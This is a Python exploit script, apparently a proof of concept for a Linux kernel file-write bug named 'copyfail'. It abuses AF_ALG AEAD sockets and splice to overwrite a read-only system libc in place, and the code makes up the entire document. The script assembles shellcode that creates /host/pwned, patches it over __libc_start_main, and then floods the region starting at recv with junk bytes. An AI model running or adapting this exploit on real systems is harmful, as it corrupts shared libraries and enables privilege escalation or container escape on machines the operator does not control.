import lief
from pwn import *
import os as g,socket as s

def d(x):return bytes.fromhex(x)
def copyfail(f,t,c, offset=0):
 a=s.socket(38,5,0);
 a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));
 h=279;
 v=a.setsockopt;
 v(h,1,d('0800010000000010'+'0'*64));
 v(h,5,None,4);
 u,_=a.accept();
 o=t+4;i=d('00');
 u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);
 r,w=g.pipe();
 n=g.splice;
 n(f,w,o,offset_src=offset);
 n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
 a.close()
 g.close(r)
 g.close(w)

context.arch = "amd64"
context.os = "linux"

target_file = "/lib/x86_64-linux-gnu/libc.so.6"
target_symbol = "__libc_start_main"
target_corrupt = "recv"

binary = lief.parse(target_file)
symbol = binary.get_symbol(target_symbol)
symbol_corrupt = binary.get_symbol("recv")

func_va = symbol.value
file_offset = binary.virtual_address_to_offset(func_va)
target_corrupt_offset = binary.virtual_address_to_offset(symbol_corrupt.value)

print(f"VA:      0x{func_va:x}")
print(f"Offset:  0x{file_offset:x}")

shellcode = asm(r"""
    mov rax, 2
    lea rdi, [rip + filename]
    mov rsi, 0x41
    mov rdx, 0x1a4
    syscall

    mov rdi, rax

    mov rax, 1
    lea rsi, [rip + msg]
    mov rdx, 7
    syscall

    mov rax, 3
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

filename:
    .ascii "/host/pwned\0"

msg:
    .ascii "litios\0"
""")

binary.patch_address(func_va, list(shellcode))
binary.write("libc-patched.so.6")
print(f'Function {target_symbol} patched -- total bytes: {len(shellcode)}')


## Launching copyfail attack
target_file_to_patch = target_file #"/home/ubuntu/libc.so.6"
f=g.open(target_file_to_patch,0);i=0;
totalsize = g.path.getsize(target_file_to_patch)
print(f'{target_file_to_patch} => size:', totalsize)

with open('libc-patched.so.6', 'rb') as input_file:
    data = input_file.read()

bytecode = data[file_offset:file_offset+len(shellcode)+20]

print(bytecode)
print(f'Writing to {target_file_to_patch} {len(bytecode)} bytes -- offset {file_offset}')
i = 0
while i<len(bytecode):
    copyfail(f,i,bytecode[i:i+4], offset=(file_offset))
    i+=4

print(f'{target_file} patched -- corrupting from `{target_corrupt}`')
bytecode = b'A' * 4096
for chunk in range(0, 20000000, 4096):
    i = 0
    while i<len(bytecode):
        copyfail(f,i,bytecode[i:i+4], offset=target_corrupt_offset+chunk)
        i+=4
